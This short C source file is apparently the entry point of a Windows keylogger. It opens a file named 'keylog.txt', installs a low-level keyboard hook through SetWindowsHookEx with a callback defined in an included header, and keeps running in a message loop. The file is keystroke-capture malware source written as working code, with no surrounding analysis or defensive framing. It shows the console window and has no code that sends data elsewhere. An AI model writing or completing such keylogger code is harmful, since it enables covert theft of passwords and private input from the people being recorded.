#include "./include/functions.h"

int main() {

    file = fopen("keylog.txt", "w");

    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_callback, NULL, 0);

    MSG message;
    while (1) {
        GetMessage(&message, NULL, 0, 0);
    }
}